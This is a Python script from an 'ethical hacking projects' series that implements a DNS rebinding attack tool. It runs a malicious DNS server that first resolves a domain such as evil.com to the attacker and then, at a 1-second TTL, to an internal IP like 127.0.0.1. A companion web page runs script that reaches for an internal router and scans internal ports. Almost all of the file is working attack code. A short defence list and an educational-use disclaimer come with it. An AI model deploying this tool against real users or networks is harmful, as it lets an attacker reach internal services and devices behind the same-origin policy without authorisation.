#!/usr/bin/env python3
"""
==============================================================
  PROJECT #15 — DNS Rebinding Attack Tool (Mode 2)
  100 Ethical Hacking Projects Series
  
  Features:
  - Malicious DNS server for rebinding attacks
  - First query returns attacker IP
  - Subsequent queries return internal IP (127.0.0.1)
  - Demonstrates bypassing same-origin policy
==============================================================

DEFENSE AGAINST DNS REBINDING:
1. DNS Pinning - Browsers pin DNS for same origin
2. SameSite cookies - Restrict cross-site requests
3. Check Host header - Verify expected domain
4. Authentication on all internal services
5. Use HTTPS with HSTS
6. Network segmentation

USAGE:
--------
  # Start DNS rebinding server
  sudo python3 dns_rebinder.py --domain evil.com --internal-ip 127.0.0.1
  
  # With custom external IP
  sudo python3 dns_rebinder.py --domain attack.local --external-ip 10.0.0.100 --internal-ip 192.168.1.1
  
  # Start web server for demo
  sudo python3 dns_rebinder.py --domain evil.com --web-port 8080
  
  # Full attack simulation
  sudo python3 dns_rebinder.py --domain evil.com --internal-ip 127.0.0.1 --web-port 8000 --internal-port 80
==============================================================
"""

import argparse
import sys
import threading
import time
import socket
from datetime import datetime
from colorama import init, Fore, Style
import http.server
import socketserver

# Initialize colorama
init(autoreset=True)

# Colors
class Colors:
    HEADER = Fore.CYAN + Style.BRIGHT
    OKBLUE = Fore.BLUE + Style.BRIGHT
    OKGREEN = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    FAIL = Fore.RED + Style.BRIGHT
    ENDC = Style.RESET_ALL
    BOLD = Style.BRIGHT
    DIM = Fore.LIGHTBLACK_EX
    MAGENTA = Fore.MAGENTA + Style.BRIGHT

# Try to import dnslib
try:
    from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, A
    from dnslib.server import DNSServer
    DNSLIB_AVAILABLE = True
except ImportError:
    print(f"{Colors.FAIL}[-] dnslib not installed! Run: pip3 install dnslib{Colors.ENDC}")
    DNSLIB_AVAILABLE = False

class DNSRebindingServer:
    def __init__(self, domain, external_ip, internal_ip, ttl=1, internal_ttl=1):
        self.domain = domain
        self.external_ip = external_ip
        self.internal_ip = internal_ip
        self.ttl = ttl
        self.internal_ttl = internal_ttl
        self.query_count = {}
        self.lock = threading.Lock()
        
    def resolve(self, request, handler):
        """DNS resolution logic - rebinding attack"""
        qname = str(request.q.qname).rstrip('.')
        
        # Only respond to our target domain
        if qname != self.domain:
            return request.reply()
        
        with self.lock:
            # Track queries per source IP
            client_ip = handler.client_address[0]
            if client_ip not in self.query_count:
                self.query_count[client_ip] = 0
            
            self.query_count[client_ip] += 1
            query_num = self.query_count[client_ip]
        
        # Create reply
        reply = request.reply()
        
        # REBINDING ATTACK:
        # First query (or low TTL expired) returns external IP (attacker's server)
        # After TTL expires, next queries return internal IP (victim's router/localhost)
        if query_num == 1:
            # First response: attacker's IP
            reply.add_answer(RR(qname, rdata=A(self.external_ip), ttl=self.ttl))
            print(f"{Colors.OKGREEN}[+] {client_ip} → {qname} → {self.external_ip} (External - First query){Colors.ENDC}")
        else:
            # Subsequent responses: internal IP (rebinding!)
            reply.add_answer(RR(qname, rdata=A(self.internal_ip), ttl=self.internal_ttl))
            print(f"{Colors.FAIL}[!] {client_ip} → {qname} → {self.internal_ip} (REBINDING! Internal IP){Colors.ENDC}")
            
            # Alert for rebinding attack
            self.alert_rebinding(client_ip)
        
        return reply
    
    def alert_rebinding(self, client_ip):
        """Alert when rebinding occurs"""
        alert = f"""
{Colors.FAIL}{'='*70}{Colors.ENDC}
{Colors.FAIL}⚠️ DNS REBINDING ATTACK IN PROGRESS! ⚠️{Colors.ENDC}
{Colors.FAIL}{'='*70}{Colors.ENDC}
{Colors.WARNING}Victim IP: {Colors.BOLD}{client_ip}{Colors.ENDC}
{Colors.WARNING}Target IP: {Colors.BOLD}{self.internal_ip}{Colors.ENDC}
{Colors.WARNING}Domain: {Colors.BOLD}{self.domain}{Colors.ENDC}
{Colors.WARNING}Attack: Browser now accessing internal IP{Colors.ENDC}
{Colors.FAIL}{'='*70}{Colors.ENDC}
"""
        print(alert)

class MaliciousWebHandler(http.server.SimpleHTTPRequestHandler):
    """Web server that demonstrates the rebinding attack"""
    
    def log_message(self, format, *args):
        print(f"{Colors.DIM}[Web] {format % args}{Colors.ENDC}")
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # JavaScript that demonstrates the rebinding attack
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Attack Demo</title>
    <style>
        body {{ font-family: monospace; padding: 20px; background: #0a0a0a; color: #0f0; }}
        .attack {{ border: 2px solid #f00; padding: 10px; margin: 10px 0; }}
        .success {{ border: 2px solid #0f0; padding: 10px; margin: 10px 0; }}
        button {{ background: #00f; color: #fff; padding: 10px; margin: 5px; cursor: pointer; }}
        pre {{ background: #111; padding: 10px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>🔥 DNS Rebinding Attack Demo</h1>
    
    <div class="attack">
        <h2>⚠️ Attack in Progress</h2>
        <p>This page is loaded from the attacker's server. Now attempting to access your internal network...</p>
    </div>
    
    <h2>Attempt 1: First Query (Attacker's Server)</h2>
    <pre id="result1">Loading...</pre>
    
    <h2>Attempt 2: After TTL Expires (Rebinding to Internal IP)</h2>
    <button onclick="attackRouter()">Attempt to Access Router</button>
    <pre id="result2"></pre>
    
    <h2>Attempt 3: Continuous Scanning</h2>
    <button onclick="scanInternal()">Scan Internal Network</button>
    <pre id="result3"></pre>
    
    <script>
        // First fetch - should get attacker's server
        fetch('/api/test')
            .then(r => r.text())
            .then(data => {{
                document.getElementById('result1').innerText = '✅ First request successful: ' + data;
            }});
        
        function attackRouter() {{
            // This fetch will go to internal IP due to DNS rebinding!
            fetch('/api/router')
                .then(r => r.text())
                .then(data => {{
                    document.getElementById('result2').innerText = '⚠️ REBINDING SUCCESSFUL! Accessed: ' + data;
                }})
                .catch(e => {{
                    document.getElementById('result2').innerText = '❌ Failed: ' + e;
                }});
        }}
        
        function scanInternal() {{
            const ports = [80, 443, 8080, 22, 3306, 3389];
            let results = '';
            
            ports.forEach(port => {{
                fetch(`/api/scan?port=${{port}}`)
                    .then(r => r.text())
                    .then(data => {{
                        results += `Port ${{port}}: ${{data}}\\n`;
                        document.getElementById('result3').innerText = results;
                    }})
                    .catch(e => {{
                        results += `Port ${{port}}: Closed\\n`;
                        document.getElementById('result3').innerText = results;
                    }});
            }});
        }}
    </script>
</body>
</html>
"""
            self.wfile.write(html.encode())
        elif self.path == '/api/test':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Attacker's Server - First Request Successful!")
        elif self.path == '/api/router':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"INTERNAL ROUTER ACCESS! (This proves DNS rebinding worked)")
        elif self.path.startswith('/api/scan'):
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Port scan would reveal internal services")
        else:
            self.send_response(404)
            self.end_headers()

def run_web_server(port=8000):
    """Run malicious web server"""
    with socketserver.TCPServer(("0.0.0.0", port), MaliciousWebHandler) as httpd:
        print(f"{Colors.OKGREEN}[+] Web server running on port {port}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Access: http://localhost:{port}{Colors.ENDC}")
        httpd.serve_forever()

def run_dns_server(domain, external_ip, internal_ip, dns_port=53):
    """Run DNS rebinding server"""
    resolver = DNSRebindingServer(domain, external_ip, internal_ip)
    server = DNSServer(resolver, port=dns_port, address="0.0.0.0")
    
    print(f"{Colors.OKGREEN}[+] DNS rebinding server running on port {dns_port}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Domain: {domain}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] External IP: {external_ip}{Colors.ENDC}")
    print(f"{Colors.FAIL}[!] Internal IP (rebinding): {internal_ip}{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] TTL: 1 second (fast rebinding){Colors.ENDC}")
    
    server.start()

def main():
    parser = argparse.ArgumentParser(description="DNS Rebinding Attack Tool")
    parser.add_argument("--domain", required=True, help="Domain to use for attack")
    parser.add_argument("--external-ip", default=None, help="External IP (attacker server)")
    parser.add_argument("--internal-ip", default="127.0.0.1", help="Internal IP to rebind to")
    parser.add_argument("--dns-port", type=int, default=53, help="DNS server port")
    parser.add_argument("--web-port", type=int, default=8000, help="Web server port")
    parser.add_argument("--no-web", action="store_true", help="Don't start web server")
    
    args = parser.parse_args()
    
    # Get external IP if not specified
    if not args.external_ip:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            args.external_ip = s.getsockname()[0]
        except:
            args.external_ip = "127.0.0.1"
        finally:
            s.close()
    
    if not DNSLIB_AVAILABLE:
        sys.exit(1)
    
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}  PROJECT #15 — DNS Rebinding Attack Tool{Colors.ENDC}")
    print(f"{Colors.FAIL}  EDUCATIONAL USE ONLY!{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
    
    print(f"{Colors.WARNING}[!] WARNING: This tool demonstrates a real attack!{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Only use on systems you own or have permission!{Colors.ENDC}\n")
    
    # Start DNS server in thread
    dns_thread = threading.Thread(target=run_dns_server, 
                                   args=(args.domain, args.external_ip, args.internal_ip, args.dns_port))
    dns_thread.daemon = True
    dns_thread.start()
    
    # Start web server if requested
    if not args.no_web:
        time.sleep(1)  # Give DNS time to start
        print(f"\n{Colors.OKBLUE}[*] Setting up demonstration...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] For the attack to work:{Colors.ENDC}")
        print(f"{Colors.DIM}  1. Configure your DNS to use this server (127.0.0.1){Colors.ENDC}")
        print(f"{Colors.DIM}  2. Visit http://{args.domain}:{args.web_port}{Colors.ENDC}")
        print(f"{Colors.DIM}  3. Watch as the domain rebinds to {args.internal_ip}{Colors.ENDC}\n")
        
        run_web_server(args.web_port)
    else:
        print(f"\n{Colors.OKGREEN}[+] DNS rebinding server running{Colors.ENDC}")
        print(f"{Colors.DIM}Point your DNS to {args.external_ip} for domain {args.domain}{Colors.ENDC}")
        dns_thread.join()

if __name__ == "__main__":
    main()